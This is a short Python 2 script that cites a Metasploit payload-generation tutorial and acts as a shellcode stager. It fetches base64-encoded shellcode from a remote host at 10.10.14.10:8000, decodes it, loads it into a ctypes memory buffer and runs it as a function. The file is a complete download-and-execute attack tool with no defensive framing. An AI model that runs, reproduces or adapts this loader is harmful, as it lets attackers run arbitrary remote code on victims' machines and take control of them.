# https://www.offensive-security.com/metasploit-unleashed/generating-payloads/
#!/usr/env/bin python
import urllib2
import ctypes
import base64

# retrieve the shellcode
url = "http://10.10.14.10:8000/shellcode.bin"
response = urllib2.urlopen(url)

# decode the shellcode from base64
shellcode = base64.b64decode(response.read())

# Create a buffer in memory
shellcode_buffer = ctypes.create_string_buffer(shellcode, len(shellcode))

# create a function pointer to our shellcode
shellcode_func = ctypes.cast(shellcode_buffer, ctypes.CFUNCTYPE(ctypes.c_void_p))

# Call our shellcode
shellcode_func()